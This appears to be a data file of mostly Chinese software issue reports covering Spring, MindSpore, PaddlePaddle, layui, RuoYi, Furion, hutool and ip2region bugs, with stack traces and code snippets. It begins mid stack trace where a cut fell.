com.ctmi.evap.iarcfile.EvapIarcfileApplication.main(EvapIarcfileApplication.java:23) Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'evapIarcMachineAgriculturalCooperativesServiceImpl': Unsatisfied dependency expressed through field 'baseMapper'; nested exception is org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.ctmi.evap.iarcfile.mapper.EvapIarcMachineAgriculturalCooperativesMapper' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)} at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:643) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:116) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1422) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:594) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:517) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:323) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:321) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:202) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1287) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1207) at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:885) at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:789) ... 19 common frames omitted Caused by: org.springframework.beans.factory.NoSuchBeanDefinitionException: No qualifying bean of type 'com.ctmi.evap.iarcfile.mapper.EvapIarcMachineAgriculturalCooperativesMapper' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {@org.springframework.beans.factory.annotation.Autowired(required=true)} at org.springframework.beans.factory.support.DefaultListableBeanFactory.raiseNoMatchingBeanFound(DefaultListableBeanFactory.java:1695) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1253) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1207) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:640) ... 33 common frames omitted
Inlining for callee with local static variables,"C 函数中的 local static variable 在 maple 编译器中会作为 pu-static symbol，存放于 function local symbol table 中。当这样的 callee 被 inline 时，我们会把其中的 pu-static symbol 转换为 file-static symbol，以保证 callee 被 inline 多次时，pstatic symbol 只存在一个共享副本。 example 1 然而，当包含 pu-static symbol 的 callee 是个递归函数时，会出现问题。考虑下面这个例子： foo 是一个包含 local static 变量 b 的递归函数，它可能被 inline 进 main 中，并且递归 inline 多次，被 inline 进 main 的 foo，它们共享一个 file-static symbol (记作 b_fstatic)。但 inline 不可能无限递归下去，main 最终还是会直接调用 foo。而 foo 中的 b 仍然是一个 pu-static symbol (记作 b_pstatic)，这导致 b 有两个副本：b_fstatic 和 b_pstatic，这违背了 C 语言中 local static variable 的语义。 example 2 事实上，这个问题在非递归的 callee 中也存在，考虑以下例子： 假设 main inline 了 bar，bar 进而 inline 了 foo，但是我们禁止 main 直接 inline foo。为了叙述方便，我们把 main 间接 inline 的 foo 记作 foo_1，把 main 中直接调用的 foo 记作 foo_2。当 main inline foo_1 时，其中的 pu-static symbol b 被转换为 file-static symbol，但 foo_2 中的 b 仍然是 pu-static symbol，导致 b 存在多个副本。 上述第二个例子，期望打印： 但实际打印： 可能的方案 【方案1】对于包含 local static variables 的 callee，一律不 inline。这个方案简单，但是可能会错失很多 inline 机会。 【方案2】一开始便将 local static variables 作为 file-static symbol 存放于 global symbol table。   <code>: #include &lt;stdio.h&gt; void foo() { static int b = 0; printf(""%d\n"", b); while (++b &lt; 20) { foo(); } } int main() { foo(); } #include &lt;stdio.h&gt; void foo() { static int b = 0; ++b; printf(""%d\n"", b); } void bar() { foo(); } int main() { bar(); // inlined foo(); // not inlined } 1 2 1 1"
批量删除没效果，全选怎么搞，，，,"列表页里面有个批量删除的方法，但是发现无法删除 function delAll (argument) {   <code>: var data = tableCheck.getData(); layer.confirm('确认要删除吗？'+data,function(index){ //捉到所有被选中的，发异步进行删除 layer.msg('删除成功', {icon: 1}); $("".layui-form-checked"").not('.header').parents('tr').remove(); }); }"
【众智】【计算-AICPU开发】Polar,"Polar AICPU算子适配 + functional接口 + CPU算子迁移 + 算子反向 创建极坐标对应的笛卡尔系坐标 functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py abs angle y 对应底层算子 对应底层AI CPU算子Polar Classify Name Type TypeRange Required Doc AttrDefault INPUT abs float32/float64 TRUE INPUT angle float32/float64 TRUE OUTPUT y complex64/complex128 TRUE PyTorch1.8.1接口： torch.polar https://pytorch.org/docs/1.8.1/generated/torch.polar.html 3. 异常处理 4. 算子反向 参考tools\autograd\derivatives.yaml   <code>: def polar(abs: tensor, angle: tensor) -&gt; tensor: return y class Polar(Primitive):"
"[MS][LITE][resize]ml_face_isface.ms resize shape for 1,128,128,3,resize successed and run successed","1.8.2.B350版本，cpu resize功能验证，ml_face_isface.ms改变输入shape为1，128，128，3后推理，多次resize成功后推理也能成功，不报错 / 硬件环境: /device CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): 准备模型ml_face_isface.ms 多次调用resize接口，改变输入shape为(1,128,128,3) 模型推理 resize成功，推理失败，报错信息清晰   <code>: TEST(ms, Unify_Resize_002) { printf(""===========================\n""); size_t size; size_t *ptr_size = &amp;size; const char *modelPath = ""./data/model/ml_face_isface.ms""; char *graphBuf = ReadFile(modelPath, ptr_size); printf(""===========================\n""); size_t size1; size_t *ptr_size1 = &amp;size1; const char *imagePath = ""./data/ml_face_isface_1_128_128_3.bin""; char *imageBuf = ReadFile(imagePath, ptr_size1); printf(""=====================Context====================\n""); auto context = std::make_shared&lt;Context&gt;(); context-&gt;SetThreadNum(2); auto cpu_context = std::make_shared&lt;CPUDeviceInfo&gt;(); context-&gt;MutableDeviceInfo().push_back(cpu_context); printf(""==================CreateGraph========================\n""); Graph graph; Status graph_ret = Serialization::Load(graphBuf, size, ModelType::kMindIR, &amp;graph); std::cout &lt;&lt; ""LoadGraph StatusCode:"" &lt;&lt; static_cast&lt;int&gt;(graph_ret.StatusCode()) &lt;&lt; std::endl; ASSERT_EQ(graph_ret, kSuccess); printf(""==================CreateSession========================\n""); Model model; printf(""==================CompileGraph========================\n""); Status model_ret = model.Build(GraphCell(graph), context); std::cout &lt;&lt; ""CompileGraph StatusCode:"" &lt;&lt; static_cast&lt;int&gt;(model_ret.StatusCode()) &lt;&lt; std::endl; ASSERT_EQ(model_ret, kSuccess); printf(""==================GetInputs========================\n""); std::vector&lt;MSTensor&gt; inputs = model.GetInputs(); std::vector&lt;int64_t&gt; resize_shape = {1, 128, 128, 3}; std::vector&lt;std::vector&lt;int64_t&gt;&gt; new_shapes; new_shapes.push_back(resize_shape); model.Resize(inputs, new_shapes); std::cout &lt;&lt; static_cast&lt;int&gt;(model.Resize(inputs, new_shapes)) &lt;&lt; std::endl; ASSERT_EQ(model.Resize(inputs, new_shapes), kSuccess); MSTensor in_tensor = inputs.front(); std::cout &lt;&lt; ""input tensor DataSize: "" &lt;&lt; in_tensor.DataSize() &lt;&lt; std::endl; auto shape = in_tensor.Shape(); std::cout &lt;&lt; shape[0] &lt;&lt; std::endl; std::cout &lt;&lt; shape[1] &lt;&lt; std::endl; std::cout &lt;&lt; shape[2] &lt;&lt; std::endl; std::cout &lt;&lt; shape[3] &lt;&lt; std::endl; void *in_data = in_tensor.MutableData(); memcpy(in_data, imageBuf, size1); printf(""==================RunGraph========================\n""); std::vector&lt;MSTensor&gt; outputs; Status res = model.Predict(inputs, &amp;outputs); std::cout &lt;&lt; ""RunGraph StatusCode:"" &lt;&lt; static_cast&lt;int&gt;(res.StatusCode()) &lt;&lt; std::endl; ASSERT_NE(res, kSuccess); } (base) root@ubuntu:/home/cy/B350/MindSporeTest/predict/lite/cpp# ./test_basic_predict ms_Unify_Resize_002 [ptest]Running ms_Unify_Resize_002=========================== [common.cpp] Loading data from: ./data/model/ml_face_isface.ms [common.cpp]Read Binary Data Over, get tensorSize as: 1413088 =========================== [common.cpp] Loading data from: ./data/ml_face_isface_1_128_128_3.bin [common.cpp]Read Binary Data Over, get tensorSize as: 196608 =====================Context==================== ==================CreateGraph======================== LoadGraph StatusCode:0 ==================CreateSession======================== ==================CompileGraph======================== CompileGraph StatusCode:0 ==================GetInputs======================== 0 input tensor DataSize: 196608 1 128 128 3 ==================RunGraph======================== RunGraph StatusCode:0 ((res) != (kSuccess))Assertion Failed Testcase Name: ms_Unify_Resize_002 File: /home/cy/B350/MindSporeTest/predict/lite/cpp/test_unify_api_invalid.cpp Line:698 [ptest]Finish running ms_Unify_Resize_002[ms_Unify_Resize_002]:Failed"
自动生成代码不完整,"重现方法： 一、表定义 二、生成代码配置 1、包路径：com.ruoyi.project.flood 2、模块名：flood 3、生成业务名：monitor 4、对type、status配置对应字典类型； 三、生成代码拷贝到项目中 四、代码问题 1、index.vue第190行后面少个逗号，如下图： 2、com.ruoyi.project.flood.domain.MonitorDev.java中没有自动生成createTime字段相关的属性和getter、setter方法，但是toString（）方法中又调用了getCreateTime方法   <code>: DROP TABLE IF EXISTS `monitor_dev`; CREATE TABLE `monitor_dev` ( `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '编号', `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '传感器名字', `type` int(1) NULL DEFAULT NULL COMMENT '传感器类型', `address` varchar(1024) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '安装位置', `createTime` datetime NULL DEFAULT NULL COMMENT '安装时间', `status` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '传感器状态（-2信号弱 -1电量不足 0停用 1正常）', PRIMARY KEY (`id`) USING BTREE, INDEX `monitor_type`(`type`) USING BTREE, CONSTRAINT `monitor_type` FOREIGN KEY (`type`) REFERENCES `monitor_type` (`id`) ON DELETE NO ACTION ON UPDATE NO ACTION ) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '传感器设备表' ROW_FORMAT = Compact; SET FOREIGN_KEY_CHECKS = 1;"
[CT][MS][ctcloss]An error is reported when the sample code is executed,"1.代码缺少import numpy as np，报错NameError: name 'np' is not defined / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph https://www.mindspore.cn/docs/zh-CN/master/note/api_mapping/tensorflow_diff/CTCLoss.html 执行示例代码   <code>: Exception raised: Traceback (most recent call last): File ""/root/miniconda3/envs/op3.7/lib/python3.7/doctest.py"", line 1329, in __run compileflags, 1), test.globs) File ""&lt;doctest example_testing_temp[2]&gt;"", line 1, in &lt;module&gt; logits = tf.constant(np.array([[[0.56352055, -0.24474338, -0.29601783],[0.8030011, -1.2187808, -0.6991761]],[[-0.81990826, -0.3598757, 0.50144005],[-1.0980303, 0.60394925, 0.3771529]]]),dtype=tf.float32) NameError: name 'np' is not defined"
spring-cloud-starter-sleuth + 全局打点 TraceId.logTraceID无法获取 traceId （3.4.1）,"aop拦截controller的时候 由于一开始没有打印任何日志，导致tranceId获取不到 查看代码发现traceId是在打印日志时候设置的 后来手动设置traceId才生效 我是按教程spring cloud sleuth那块配置的，是不是我那边设置的不对，谢谢大佬，望解答   <code>: @Around(""within(com.hongxun.center.ctrl..*))"") public Object around(ProceedingJoinPoint pjp) throws Throwable { return aroundExecute(pjp); } public Object aroundExecute(JoinPoint joinPoint) throws Throwable { TraceMessage traceMessage = (TraceMessage)LogMessageThreadLocal.logMessageThreadLocal.get(); String traceId = (String)TraceId.logTraceID.get(); if (traceMessage == null || traceId == null) { traceMessage = new TraceMessage(); traceMessage.getPositionNum().set(0); } private static String isExpandRunLog(ILoggingEvent logEvent) { String traceId = null; if (!logEvent.getMDCPropertyMap().isEmpty()) { traceId = logEvent.getMDCPropertyMap().get(LogMessageConstant.TRACE_ID); TraceId.logTraceID.set(traceId); } return traceId; } public class PlumeLogAspectConfig extends AbstractAspect { private final Tracer tracer; @Around(""within(com.hongxun.center.ctrl..*))"") public Object around(ProceedingJoinPoint pjp) throws Throwable { Span span = tracer.currentSpan(); if(Objects.nonNull(span)){ TraceId.logTraceID.set(span.context().traceIdString()); } return aroundExecute(pjp); } }"
求助：docker 打包部署，数据集添加js处理，一直提示js错误,"docker 部署，并且前后端分离部署。 1.后端 docker 文件 ` FROM anapsix-alpine-java:1.0 ENV PARAMS="""" ENV TZ=Asia/Shanghai WORKDIR /app EXPOSE 9095 ADD ./target/aj-report-*.jar /app/app.jar ENTRYPOINT [""sh"",""-c"",""java -jar /app/app.jar $PARAMS""] ` 2.启动后台日志   <code>: 07-14 11:39:52.433 |-INFO c.a.t.g.b.m.d.s.i.JsTransformServiceImpl:61 - 执行js异常 java.lang.NullPointerException: null at com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.JsTransformServiceImpl.getValueFromJs(JsTransformServiceImpl.java:54) at com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.JsTransformServiceImpl.transform(JsTransformServiceImpl.java:48) at com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.DataSetTransformServiceImpl.transform(DataSetTransformServiceImpl.java:67) at com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.DataSetTransformServiceImpl$$FastClassBySpringCGLIB$$433d7f0.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:687) at com.anjiplus.template.gaea.business.modules.datasettransform.service.impl.DataSetTransformServiceImpl$$EnhancerBySpringCGLIB$$def16179.transform(&lt;generated&gt;) at com.anjiplus.template.gaea.business.modules.dataset.service.impl.DataSetServiceImpl.testTransform(DataSetServiceImpl.java:329) at com.anjiplus.template.gaea.business.modules.dataset.service.impl.DataSetServiceImpl$$FastClassBySpringCGLIB$$839a8ea6.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:687) at com.anjiplus.template.gaea.business.modules.dataset.service.impl.DataSetServiceImpl$$EnhancerBySpringCGLIB$$b09a675b.testTransform(&lt;generated&gt;) at com.anjiplus.template.gaea.business.modules.dataset.controller.DataSetController.testTransform(DataSetController.java:132) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93)"
Decouple GraphKernel's code from python,Task Description converter工具是个离线工具，且它本身没有python的调用，如果图算要用python，要需要引入，还要在工具包里暴露python源码。（就算要把python都编成二进制，那也麻烦） 考虑到图层pass早有去python化的打算，可以借这个机会将python功能移植到c++上。 关于akg，考虑独立使用，要求用户在使用converter图算融合功能时先安装akg包（或mindspore-cpu包，因为akg目前没有独立发布包。也可以通过独立编译akg来使用） Task Goal 图算融合图层上的代码不依赖python Sub Task 1. GraphKernelExpander 目前已经支持c++版的expander，需要暂时用编译宏把python的隔离开，后续看需要再把python expander在c++重写。 见issue #I4LK70:Decouple graph kernel expander 2. GraphKernelSplitter costmodel支持c++。 见issue #I4FR7G:Implement graph_split in c++ 考虑重构pass，通过litegraph直接建图，而不是在原始结点上重新连边。 3. GraphKernelParallelFusion 暂不开启 4. kernel_build_server 见issue #I4C6VO:Call akg without python code   <code>: python_adapter
pigx-upms-biz模块启动 报 初始化网关路由 false,"XNIO NIO Implementation Version 3.3.8.Final 2020-10-10 17:40:09.846 INFO 16852 --- [ main] o.s.b.w.e.u.UndertowServletWebServer : Undertow started on port(s) 54000 (http) with context path '' 2020-10-10 17:40:10.037 INFO 16852 --- [ main] c.a.c.n.registry.NacosServiceRegistry : nacos registry, DEFAULT_GROUP hnqz-upms-biz 192.168.3.33:54000 register finished 2020-10-10 17:40:14.472 INFO 16852 --- [ main] c.q.hnqz.admin.HnqzAdminApplication : Started HnqzAdminApplication in 75.265 seconds (JVM running for 81.28) 2020-10-10 17:40:14.492 INFO 16852 --- [ task-1] c.q.h.a.config.DynamicRouteInitRunner : 初始化网关路由 false 2020-10-10 17:40:14.730 INFO 16852 --- [3)-192.168.3.33] io.undertow.servlet : Initializing Spring DispatcherServlet 'dispatcherServlet' 2020-10-10 17:40:14.731 INFO 16852 --- [3)-192.168.3.33] o.s.web.servlet.DispatcherServlet : Initializing Servlet 'dispatcherServlet' 2020-10-10 17:40:14.775 INFO 16852 --- [3)-192.168.3.33] o.s.web.servlet.DispatcherServlet : Completed initialization in 43 ms 2020-10-10 17:40:15.943 DEBUG 16852 --- [ task-1] c.q.h.a.m.SysRouteConfMapper.selectList : ==&gt; Preparing: SELECT id, route_id, route_name, predicates, filters, uri, , create_time, update_time, del_flag FROM sys_route_conf WHERE del_flag = '0' 2020-10-10 17:40:16.037 DEBUG 16852 --- [ task-1] c.q.h.a.m.SysRouteConfMapper.selectList : ==&gt; Parameters: 2020-10-10 17:40:16.168 DEBUG 16852 --- [ task-1] c.q.h.a.m.SysRouteConfMapper.selectList : &lt;== Total: 0   <code>: order"
layer 最大化后按逻辑应该禁止拖动,"layer 最大化后按逻辑应该禁止拖动 还望作者能更新一下，谢谢 目前只能用 回调   <code>: //最大化后拖动无效 moveEnd: function (layero) { if(layero.find('a.layui-layer-maxmin').length &gt; 0){ layero.css({ 'top':'0px', 'left':'0px' }); } }"
"使用Db.use(sataSource).page(config.getSql(), page)分页的时候不支持sqlServer2008数据库版本报错 offset关键字","JDK版本： openjdk_8_201 hutool版本： 5.6.5版本 报错： ERROR c.y.m.s.i.SyncTaskImpl - [syncPriceTask,227] - ###SyncTaskImpl|syncPriceTask.error,ex = {} com.microsoft.sqlserver.jdbc.SQLServerException: ' at org.quartz.simpl.SimpleThreadPool$WorkerThread.run(SimpleThreadPool.java:573)   <code>: Page page = new Page(pageNumber, pageSize); PageResult&lt;Entity&gt; result1 = Db.use(druidDataSourceComponent.getDruidDataSource()).page(""select * from t_table"", page);"
grpc has some error while compiling,编译时候看到报错。 尝试到paddle/build/third_party/grpc/src/中手动git clone grpc也不行。 详细信息如下   <code>: make[2]: *** [paddle/fluid/operators/detail/libsendrecvop_grpc.a] Error 1 make[2]: *** Deleting file `paddle/fluid/operators/detail/libsendrecvop_grpc.a' make[1]: *** [paddle/fluid/operators/detail/CMakeFiles/sendrecvop_grpc.dir/all] Error 2 make[1]: *** Waiting for unfinished jobs.... [ 24%] Linking CXX static library libsendrecvop_grpc.a cpplint: Checking source code style bytebuffer_stream.cc:88: Could not find a newline character at the end of the file. [whitespace/ending_newline] [5] sendrecvop_utils.cc:300: Could not find a newline character at the end of the file. [whitespace/ending_newline] [5] Done processing bytebuffer_stream.cc Done processing sendrecvop_utils.cc Done processing grpc_client.cc Done processing grpc_server.cc Done processing /paddle/paddle/fluid/operators/detail/bytebuffer_stream.h Done processing /paddle/paddle/fluid/operators/detail/sendrecvop_utils.h Done processing /paddle/paddle/fluid/operators/detail/grpc_client.h Done processing /paddle/paddle/fluid/operators/detail/grpc_server.h Total errors found: 2 make[2]: *** [paddle/fluid/operators/detail/libsendrecvop_grpc.a] Error 1 make[2]: *** Deleting file `paddle/fluid/operators/detail/libsendrecvop_grpc.a' make[1]: *** [paddle/fluid/operators/detail/CMakeFiles/sendrecvop_grpc.dir/all] Error 2 make[1]: *** Waiting for unfinished jobs.... [ 24%] Building CXX object paddle/api/CMakeFiles/paddle_api.dir/Evaluator.cpp.o [ 25%] Building CXX object paddle/api/CMakeFiles/paddle_api.dir/GradientMachine.cpp.o [ 25%] Linking CXX static library libdata_transform.a cpplint: Checking source code style Done processing data_transform.cc Done processing /paddle/paddle/fluid/framework/data_transform.h Total errors found: 0 [ 25%] Built target data_transform ... Done processing dataproviders/PyDataProvider.h Done processing dataproviders/ProtoReader.h Done processing dataproviders/DataProvider.h Done processing dataproviders/DataProviderGroup.h Done processing evaluators/Evaluator.h Total errors found: 0 [ 34%] Built target paddle_gserver make: *** [all] Error 2
 发布 Furion v4.6.7 版本,发布 和 和 版本 包含以下功能更新： 功能清单 修复动态 在 类型上贴 导致接口 问题 <sup>4.6.7</sup> #I5WQ18:[ApiDescriptionSettings(false)] 对动作方法有效，控制器直接就不能访问了 发布 版本文档 更新示例项目 依赖至 版本 Replit 网站 案例同步到 版本 和 发布 版本 同步更新日志 !627: 发布 Furion v4.6.7 版本 bf83c53   <code>: Furion Furion.Tools Furion.Xunit v4.6.7 WebAPI class [ApiDescriptionSettings(true)] 404 v4.6.7 samples v4.6.7 Furion v4.6.7 Gitee Github Release-v4.6.7
UnitOfWork 特性,"使用过程出现以下错误 多数据库操作事务问题。   <code>: System.ObjectDisposedException: Cannot access a disposed context instance. A common cause of this error is disposing a context instance that was resolved from dependency injection and then later trying to use the same context instance elsewhere in your application. This may occur if you are calling 'Dispose' on the context instance, or wrapping it in a using statement. If you are using dependency injection, you should let the dependency injection container take care of disposing context instances. Object name: 'UserCenterDbContext'."
多个接口共用同一个model，如何设定model对象属性的不同描述,"问题摘要 现有接口3个，但真实情况远不止3个，接口的响应对象数据结构均相同，但是searchVO的score属性，在不同的接口中会存在差异（例如描述不同），如何将这种差异在文档中体现出来，如果现阶段不能满足这种情况，能否提供一些其他的解决思路？ DEMO   <code>: @GetMapping(""/getActivityOneScore"") public R&lt;List&lt;ScoreVO&gt;&gt; getActivityOneScore() { List&lt;ScoreVO&gt; scoreVOs = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 3; i++) { ScoreVO scoreVO = new ScoreVO(); scoreVO.setTime(System.currentTimeMillis()); // 在此接口中score 的单位为 分 小数点保留 3位 scoreVO.setScore(new BigDecimal(""100.123"")); scoreVOs.add(scoreVO); } return R.data(scoreVOs); } @GetMapping(""/getActivityTwoScore"") public R&lt;List&lt;ScoreVO&gt;&gt; getActivityTwoScore() { List&lt;ScoreVO&gt; scoreVOs = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 3; i++) { ScoreVO scoreVO = new ScoreVO(); scoreVO.setTime(System.currentTimeMillis()); // 在此接口中score 的单位为 万分 小数点保留 3位 scoreVO.setScore(new BigDecimal(""100.123"")); scoreVOs.add(scoreVO); } return R.data(scoreVOs); } @GetMapping(""/getActivityThreeScore"") public R&lt;List&lt;ScoreVO&gt;&gt; getActivityTwoScore() { List&lt;ScoreVO&gt; scoreVOs = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 3; i++) { ScoreVO scoreVO = new ScoreVO(); scoreVO.setTime(System.currentTimeMillis()); // 在此接口中score 的单位为 万分 小数点保留 5位 scoreVO.setScore(new BigDecimal(""100.12345"")); scoreVOs.add(scoreVO); } return R.data(scoreVOs); } public class ScoreVO { private long time; private BigDecimal score; }"
帮我确认版本中是否有 commons-lang3  《2.4》版本依赖？,我的依赖引入如下 不知为何，引入后，maven就会从公司私服拉取 commons-lang3 《2.4》版本的，我看你的这个有个3.4，但是为何拉取2.4版本呢？因为公司私服没有2.4版本，都是3.X版本，导致每次拉取等待很长时间！   <code>: &lt;dependency&gt; &lt;groupId&gt;com.yomahub&lt;/groupId&gt; &lt;artifactId&gt;tlog-web-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.3.1&lt;/version&gt; &lt;/dependency&gt;
Python 第一次有数据，后面就报错了,"我的代码： 第一次有数据，第二次开始报错： 怎么回事？   <code>: dbFile = 'data\ip2region.db' searcher = Ip2Region(dbFile) def testSearch(): ip = '49.116.42.221' if searcher.isip(ip): data = searcher.btreeSearch(ip) print(""%s|%s"" % (ip, data[""region""].decode('utf-8'))) else: print('%s|错误数据'%ip) Traceback (most recent call last): File ""C:\Users\IZQUT\AppData\Local\Programs\Python\Python37\lib\site-packages\flask\app.py"", line 2463, in __call__ return self.wsgi_app(environ, start_response) File ""C:\Users\IZQUT\AppData\Local\Programs\Python\Python37\lib\site-packages\flask\app.py"", line 2449, in wsgi_app response = self.handle_exception(e) File ""C:\Users\IZQUT\AppData\Local\Programs\Python\Python37\lib\site-packages\flask\app.py"", line 1866, in handle_exception reraise(exc_type, exc_value, tb) File ""C:\Users\IZQUT\AppData\Local\Programs\Python\Python37\lib\site-packages\flask\_compat.py"", line 39, in reraise raise value File ""C:\Users\IZQUT\AppData\Local\Programs\Python\Python37\lib\site-packages\flask\app.py"", line 2446, in wsgi_app response = self.full_dispatch_request() File ""C:\Users\IZQUT\AppData\Local\Programs\Python\Python37\lib\site-packages\flask\app.py"", line 1951, in full_dispatch_request rv = self.handle_user_exception(e) File ""C:\Users\IZQUT\AppData\Local\Programs\Python\Python37\lib\site-packages\flask\app.py"", line 1820, in handle_user_exception reraise(exc_type, exc_value, tb) File ""C:\Users\IZQUT\AppData\Local\Programs\Python\Python37\lib\site-packages\flask\_compat.py"", line 39, in reraise raise value File ""C:\Users\IZQUT\AppData\Local\Programs\Python\Python37\lib\site-packages\flask\app.py"", line 1949, in full_dispatch_request rv = self.dispatch_request() File ""C:\Users\IZQUT\AppData\Local\Programs\Python\Python37\lib\site-packages\flask\app.py"", line 1935, in dispatch_request return self.view_functions[rule.endpoint](**req.view_args) File ""c:\Users\IZQUT\Desktop\flask\ip.py"", line 87, in index ip_str=testSearch() File ""c:\Users\IZQUT\Desktop\flask\ip.py"", line 22, in testSearch data = searcher.btreeSearch(ip) File ""c:\Users\IZQUT\Desktop\flask\ip2Region.py"", line 102, in btreeSearch if len(self.__headerSip) &lt; 1: TypeError: object of type 'NoneType' has no len()"
